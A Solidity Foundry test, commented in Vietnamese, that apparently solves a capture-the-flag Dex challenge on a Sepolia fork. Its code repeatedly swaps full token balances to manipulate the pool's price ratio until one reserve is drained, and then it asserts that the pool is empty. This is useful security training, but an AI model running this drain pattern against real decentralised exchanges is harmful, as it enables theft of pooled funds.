// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(
        address token,
        address account
    ) external view returns (uint256);
}

contract DexExploitTest is Test {
    IDex public dexContract;
    address public token1;
    address public addressOfToken2;

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        // Thay địa chỉ Instance Dex thực tế trên Sepolia của ông vào đây
        dexContract = IDex(0x1234567890123456789012345678901234567890);
        token1 = dexContract.token1();
        addressOfToken2 = dexContract.token2();
    }

    function test_DexDrain() public {
        address player = address(this);

        // Cấp quyền cho contract Dex chi tiêu token phục vụ quá trình swap
        dexContract.approve(address(dexContract), type(uint256).max);

        // Thực thi chuỗi vòng lặp hoán đổi tối ưu hóa toán học cơ số
        swapStep(token1, addressOfToken2);
        swapStep(addressOfToken2, token1);
        swapStep(token1, addressOfToken2);
        swapStep(addressOfToken2, token1);
        swapStep(token1, addressOfToken2);

        // Vòng chốt hạ: Tính toán lượng Token2 cần thiết để vét sạch lượng Token1 còn sót lại
        uint256 playerToken2Bal = dexContract.balanceOf(
            addressOfToken2,
            player
        );
        uint256 dexToken1Bal = dexContract.balanceOf(
            token1,
            address(dexContract)
        );
        uint256 dexToken2Bal = dexContract.balanceOf(
            addressOfToken2,
            address(dexContract)
        );

        uint256 finalSwapAmount = (dexToken1Bal * dexToken2Bal) /
            dexContract.balanceOf(token1, address(dexContract));

        // Nếu số dư người chơi có nhiều hơn lượng cần thiết, ta chỉ swap đúng phần thiếu để tránh nghẽn
        if (playerToken2Bal >= finalSwapAmount) {
            dexContract.swap(addressOfToken2, token1, finalSwapAmount);
        } else {
            dexContract.swap(addressOfToken2, token1, playerToken2Bal);
        }

        // Kiểm tra xem ít nhất 1 trong 2 loại token của Pool đã bị vét sạch về 0
        uint256 postDexToken1 = dexContract.balanceOf(
            token1,
            address(dexContract)
        );
        uint256 postDexToken2 = dexContract.balanceOf(
            addressOfToken2,
            address(dexContract)
        );

        assertTrue(
            postDexToken1 == 0 || postDexToken2 == 0,
            "Audit failed: Dex was not drained"
        );
        emit log(
            "Audit Verification: Dex pool successfully drained using mathematical slippage manipulation."
        );
    }

    function swapStep(address from, address to) internal {
        uint256 balanceToSwap = dexContract.balanceOf(from, address(this));
        if (balanceToSwap > 0) {
            dexContract.swap(from, to, balanceToSwap);
        }
    }
}
